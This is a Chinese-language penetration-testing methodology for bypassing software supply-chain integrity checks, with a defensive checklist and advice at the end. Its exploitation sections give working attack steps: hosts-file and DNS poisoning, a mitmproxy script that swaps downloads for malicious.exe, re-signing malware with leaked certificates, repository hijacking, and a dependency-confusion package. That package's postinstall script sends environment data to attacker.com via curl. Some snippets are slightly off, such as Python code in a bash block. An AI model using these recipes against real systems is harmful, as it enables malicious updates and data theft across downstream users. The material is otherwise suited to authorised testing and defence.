# 软件供应链完整性验证绕过方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的软件供应链完整性验证绕过攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用软件供应链中的完整性验证缺陷，包括代码签名绕过、哈希校验绕过、DNS 欺骗、中间人攻击、仓库劫持等技术。

## 1.2 适用范围

本文档适用于以下场景：
- 软件自动更新机制
- 依赖包下载和安装
- 固件/驱动更新
- 容器镜像拉取
- CI/CD 构建产物下载
- 第三方库/组件集成
- 插件/扩展安装

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行供应链安全评估的顾问
- 负责软件完整性保护的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：软件供应链完整性验证绕过

### 2.1 技术介绍

软件供应链完整性验证绕过是指攻击者通过技术手段绕过软件对下载代码、依赖包、更新文件的完整性检查，使恶意代码被当作可信代码执行。

**CWE 映射：**
| CWE 编号 | 描述 |
|---------|------|
| CWE-494 | 下载代码时未进行完整性检查 |
| CWE-345 | 数据真实性验证不足 |
| CWE-353 | 缺少完整性检查支持 |
| CWE-426 | 不可信搜索路径 |
| CWE-427 | 不受控的搜索路径元素 |
| CWE-506 | 嵌入恶意代码 |

**攻击原理：**
- **签名验证缺失**：软件未对下载内容进行数字签名验证
- **哈希校验绕过**：使用弱哈希算法或校验逻辑缺陷
- **证书验证禁用**：HTTPS 证书验证被禁用或绕过
- **DNS 欺骗**：将下载域名解析到攻击者服务器
- **中间人攻击**：在传输过程中修改内容
- **仓库劫持**：接管废弃的仓库名称

**本质：** 软件信任了未经验证完整性的外部代码，违背了"零信任"原则。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **软件自动更新** | 桌面应用、移动应用更新 | 更新包无签名验证 |
| **依赖包安装** | npm/pip/maven 安装依赖 | 依赖源被污染 |
| **固件更新** | IoT 设备、路由器固件 | 固件无完整性校验 |
| **容器镜像** | Docker 镜像拉取 | 镜像未签名 |
| **CI/CD 构建** | 构建产物下载 | 制品完整性未验证 |
| **插件系统** | 浏览器扩展、IDE 插件 | 插件来源未验证 |
| **驱动更新** | 硬件驱动自动安装 | 驱动签名验证不足 |
| **脚本下载执行** | curl/wget 管道执行 | 脚本完整性未验证 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**更新机制分析：**

1. **识别更新流程**
   ```bash
   # 监控软件更新网络请求
   # 使用 Wireshark、Fiddler、Burp Suite

   # 识别更新服务器
   curl -I https://update.target.com/latest

   # 检查更新响应
   {
     "version": "2.0.0",
     "downloadUrl": "https://cdn.target.com/app-2.0.0.exe",
     "checksum": "md5:abc123",
     "signature": ""
   }
   ```

2. **检查完整性验证**
   ```bash
   # 测试是否验证签名
   # 1. 修改下载文件的一个字节
   # 2. 重新计算哈希
   # 3. 观察软件是否拒绝安装

   # 测试哈希算法强度
   # MD5/SHA1 已不安全，可尝试碰撞攻击
   ```

3. **DNS 记录分析**
   ```bash
   # 检查更新域名
   dig update.target.com
   dig cdn.target.com

   # 检查 SPF、DKIM、DMARC 记录
   dig target.com TXT

   # 检查 DNSSEC
   dig +dnssec target.com
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **检查下载代码**
   ```python
   # 危险模式：无证书验证
   import requests
   response = requests.get('https://update.target.com/update.exe', verify=False)

   # 危险模式：使用弱哈希
   import hashlib
   if hashlib.md5(file).hexdigest() == expected_md5:
       install()

   # 危险模式：无签名验证
   def download_update():
       file = download('https://update.target.com/update.exe')
       install(file)  # 直接安装，无验证
   ```

2. **检查依赖配置**
   ```json
   // 危险模式：使用 latest 或模糊版本
   {
     "dependencies": {
       "some-package": "*",
       "another-package": "latest"
     }
   }

   // 安全模式：固定版本和哈希
   {
     "dependencies": {
       "some-package": {
         "version": "1.2.3",
         "integrity": "sha512-..."
       }
     }
   }
   ```

3. **检查 CI/CD 配置**
   ```yaml
   # 危险模式：无签名验证
   - name: Download Artifact
     run: curl -O https://artifacts.target.com/build.exe

   # 安全模式：验证签名
   - name: Download and Verify
     run: |
       curl -O https://artifacts.target.com/build.exe
       curl -O https://artifacts.target.com/build.exe.sig
       gpg --verify build.exe.sig build.exe
   ```

### 2.4 漏洞利用方法

#### 2.4.1 DNS 欺骗攻击

**攻击原理：** 将软件更新域名解析到攻击者控制的服务器。

**攻击步骤：**

**步骤 1：DNS 投毒**
```bash
# 方法 1：针对本地网络
# 修改 hosts 文件（需要物理访问）
echo "192.168.1.100 update.target.com" >> /etc/hosts

# 方法 2：DNS 缓存投毒
# 针对未使用 DNSSEC 的 DNS 服务器
# 使用工具如 dnschef
dnschef --fakeip update.target.com=192.168.1.100
```

**步骤 2：搭建恶意更新服务器**
```bash
# 搭建 HTTP 服务器
python3 -m http.server 80

# 目录结构
updates/
├── latest.json          # 版本信息
├── app-2.0.0.exe        # 恶意更新包
└── update.exe.sig       # 伪造签名（如果需要）
```

**步骤 3：诱导软件更新**
```bash
# 触发软件检查更新
# 恶意服务器返回伪造更新信息
{
  "version": "99.0.0",
  "downloadUrl": "http://192.168.1.100/malicious.exe",
  "checksum": "md5:$(md5 malicious.exe)"
}
```

#### 2.4.2 中间人攻击

**攻击原理：** 在传输过程中修改下载内容。

**前提条件：**
- 使用 HTTP 而非 HTTPS
- HTTPS 证书验证被禁用
- 客户端信任攻击者安装的 CA

**攻击步骤：**

**步骤 1：设置中间人代理**
```bash
# 使用 mitmproxy
mitmproxy --mode transparent --set confdir=~/.mitmproxy

# 或使用 BetterCAP
bettercap -iface eth0
```

**步骤 2：拦截下载请求**
```bash
# mitmproxy 脚本示例
def response(flow):
    if flow.request.path.endswith('.exe'):
        # 替换为恶意文件
        flow.response.content = open('malicious.exe', 'rb').read()
```

**步骤 3：绕过证书验证**
```bash
# 如果目标禁用证书验证
# curl -k, requests verify=False
# 中间人攻击可直接进行
```

#### 2.4.3 哈希校验绕过

**方法 1：MD5 碰撞攻击**
```bash
# 使用 HashClash 生成 MD5 碰撞
# 需要大量计算资源，但理论可行

hashclash original.bin malicious.bin
# 两个文件 MD5 相同，但内容不同
```

**方法 2：哈希计算逻辑缺陷**
```bash
# 常见缺陷模式
# 1. 只检查哈希长度，不检查内容
if len(hash) == 32:  # MD5 长度
    install()

# 2. 哈希比较逻辑错误
if expected_hash in actual_hash:  # 子串匹配
    install()

# 3. 大小写敏感问题
if hash.lower() == expected.lower():
    install()
```

#### 2.4.4 签名验证绕过

**方法 1：利用验证逻辑缺陷**
```python
# 常见缺陷模式
def verify_signature(file, signature):
    # 缺陷 1：空签名通过
    if not signature:
        return True

    # 缺陷 2：签名检查逻辑错误
    if signature == "VALID":
        return True

    # 缺陷 3：时间检查绕过
    if not check_timestamp():  # 如果检查失败
        return True  # 错误地返回通过

    return actual_verify(file, signature)
```

**方法 2：利用已泄露的签名证书**
```bash
# 使用从其他软件提取的有效签名
# 或过期的代码签名证书（某些系统仍信任）

# 对恶意文件重新签名
osslsigncode sign -certs leaked.crt -key leaked.key \
  -in malicious.exe -out signed_malicious.exe
```

#### 2.4.5 仓库劫持攻击

**攻击原理：** 接管废弃的仓库名称，发布恶意更新。

**攻击步骤：**

**步骤 1：识别目标仓库**
```bash
# 查找不再维护的流行库
# - GitHub 仓库已删除
# - npm/PyPI 包已删除
# - 域名已过期
```

**步骤 2：注册相同名称**
```bash
# npm
npm publish --scope @original/package

# PyPI
twine upload dist/package-1.0.0.tar.gz

# GitHub
# 创建相同名称的仓库
```

**步骤 3：发布恶意更新**
```bash
# 发布包含恶意代码的新版本
# 依赖该包的项目将自动下载恶意版本
```

#### 2.4.6 依赖混淆攻击

**攻击原理：** 利用包管理器优先级，发布与内部包同名的公共包。

**攻击步骤：**

**步骤 1：识别内部包名**
```bash
# 通过源码泄露、错误配置等获取
# @internal/package
# company-internal-lib
```

**步骤 2：发布公共包**
```bash
mkdir malicious-pkg
cd malicious-pkg

cat > package.json << EOF
{
  "name": "@internal/package",
  "version": "99.99.99",
  "scripts": {
    "postinstall": "node exploit.js"
  }
}
EOF

cat > exploit.js << EOF
const { exec } = require('child_process');
exec('curl http://attacker.com/exfil?env=' + encodeURIComponent(process.env.NODE_ENV));
EOF

npm publish
```

#### 2.4.7 信息收集命令

```bash
# 收集软件更新信息
curl -I https://target.com/update
curl https://target.com/api/version

# 检查下载连接
curl -v https://update.target.com/update.exe 2>&1 | grep -i "certificate\|ssl"

# 检查签名
osslsigncode verify -CAfile ca.crt update.exe

# 检查哈希
sha256sum update.exe
md5sum update.exe

# 收集依赖信息
cat package.json
cat requirements.txt
cat pom.xml
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 HTTPS 验证

**方法 1：利用证书验证禁用**
```bash
# 检查目标是否禁用证书验证
# curl -k, wget --no-check-certificate
# Python requests verify=False
# Java TrustAllManager
```

**方法 2：安装恶意 CA**
```bash
# 诱导用户安装攻击者控制的 CA 证书
# 利用企业已信任的 CA 签发恶意证书
```

#### 2.5.2 绕过签名验证

**方法 1：利用验证时机**
```bash
# 某些软件在下载后很久才验证签名
# 可以在验证前使用恶意文件

# 或者利用异步验证的时间窗口
```

**方法 2：利用签名缓存**
```bash
# 如果软件缓存签名验证结果
# 可以替换文件但保留缓存
```

#### 2.5.3 绕过沙箱隔离

**方法 1：沙箱逃逸**
```bash
# 利用沙箱实现漏洞
# 如 Docker 逃逸、Node.js 沙箱逃逸
```

**方法 2：利用可信代码**
```bash
# 如果沙箱允许某些可信代码执行
# 可以篡改这些代码
```

#### 2.5.4 持久化技术

**方法 1：更新机制持久化**
```bash
# 如果能控制更新服务器
# 可以持续提供恶意更新
```

**方法 2：依赖链持久化**
```bash
# 污染深层依赖
# 影响所有依赖该包的项目
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **DNS 欺骗** | 更新域名 | `echo "192.168.1.100 update.target.com" >> /etc/hosts` | 本地 hosts 投毒 |
| **中间人** | HTTP 下载 | mitmproxy 脚本替换文件 | 传输中篡改 |
| **哈希绕过** | MD5 校验 | hashclash 生成碰撞文件 | MD5 碰撞攻击 |
| **签名绕过** | 空签名 | `signature: ""` | 利用验证缺陷 |
| **仓库劫持** | 废弃包名 | npm publish 接管名称 | 接管废弃仓库 |
| **依赖混淆** | 内部包名 | 发布同名公共包 | 包优先级攻击 |

## 3.2 常见完整性验证机制

| 机制 | 强度 | 备注 |
|-----|------|------|
| **无验证** | 无 | 直接执行下载内容 |
| **MD5 校验** | 弱 | 已证明可碰撞 |
| **SHA1 校验** | 弱 | 已证明可碰撞 |
| **SHA256 校验** | 中 | 目前安全，但需安全传输 |
| **数字签名** | 强 | 需保护私钥 |
| **多重签名** | 强 | 多私钥签名，更安全 |
| **SLSA 来源** | 强 | 完整来源追踪 |

## 3.3 软件供应链安全检查清单

- [ ] 下载代码有数字签名验证
- [ ] 使用强哈希算法（SHA256+）
- [ ] HTTPS 证书严格验证
- [ ] 依赖版本固定
- [ ] 依赖完整性验证（integrity 字段）
- [ ] 私有源优先级正确配置
- [ ] 更新服务器身份验证
- [ ] 有防回滚保护
- [ ] CI/CD 制品有签名
- [ ] 容器镜像有签名

## 3.4 防御建议

1. **代码签名**：对所有下载内容使用数字签名
2. **强哈希校验**：使用 SHA256 或更强算法
3. **HTTPS 强制**：所有下载连接使用 HTTPS 并严格验证证书
4. **来源验证**：验证下载来源的真实性
5. **多重验证**：结合签名 + 哈希 + 来源多重验证
6. **依赖锁定**：固定所有依赖版本，使用 integrity 字段
7. **私有源保护**：正确配置私有源优先级
8. **更新审计**：记录所有更新操作，便于追溯
9. **沙箱执行**：在隔离环境中执行新下载代码
10. **监控告警**：监控异常的下载和执行行为

---

**参考资源：**
- [OWASP Software Supply Chain Security](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html)
- [SLSA Framework](https://slsa.dev/)
- [NIST SP 800-204D](https://csrc.nist.gov/publications/detail/sp/800-204/d/final)
- [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
- [The Update Framework (TUF)](https://theupdateframework.io/)
